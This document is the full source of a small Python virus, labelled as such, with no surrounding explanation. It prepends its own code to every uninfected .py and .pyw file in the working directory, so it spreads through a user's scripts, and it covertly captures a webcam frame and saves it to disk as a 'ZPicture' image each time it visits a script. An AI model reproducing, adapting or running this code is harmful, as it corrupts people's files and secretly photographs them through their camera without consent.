### START OF VIRUS ###

import sys, glob, cv2
code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### START OF VIRUS ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### END OF VIRUS ###\n':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### END OF VIRUS ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

    videoCaptureObject = cv2.VideoCapture(0)
    result = True
    count = 0
    photo = glob.glob('*.jpg')
    while(result):
        ret,frame = videoCaptureObject.read()
        for name in photo:
            if name:
                count += 1
        rename = 'ZPicture' + str(count) + '.jpg'
        cv2.imwrite(rename,frame)
        result = False
    videoCaptureObject.release()
    cv2.destroyAllWindows()


### END OF VIRUS ###
